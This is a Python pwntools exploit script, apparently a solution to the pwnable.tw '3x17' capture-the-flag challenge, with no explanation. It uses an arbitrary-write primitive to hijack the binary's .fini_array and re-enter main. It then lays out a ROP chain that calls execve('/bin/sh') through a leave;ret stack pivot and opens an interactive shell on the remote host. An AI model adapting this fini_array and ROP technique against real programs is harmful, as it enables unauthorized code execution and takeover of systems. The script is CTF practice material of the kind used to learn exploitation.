from pwn import *

p = remote('chall.pwnable.tw', 10105)
e = ELF('./3x17')

def write(addr, value):
	p.sendlineafter(':', str(addr))
	p.sendafter(':', value)

fini_array = 0x4b40f0
fini_array_call = 0x402960

main = 0x401b6d
binsh = e.bss()
syscall = 0x481ca5
pop_rax = 0x41e4af
pop_rdi = 0x47dce5
pop_rsi = 0x48db36
pop_rdx = 0x446e35
leave_ret = 0x48a281

write(fini_array, p64(fini_array_call) + p64(main))
write(binsh, '/bin/sh\x00')
write(fini_array + 16, p64(pop_rax) + p64(59))
write(fini_array + 32, p64(pop_rdi) + p64(binsh))
write(fini_array + 48, p64(pop_rsi) + p64(0))
write(fini_array + 64, p64(pop_rdx) + p64(0))
write(fini_array + 80, p64(syscall))
write(fini_array, p64(leave_ret))
p.interactive()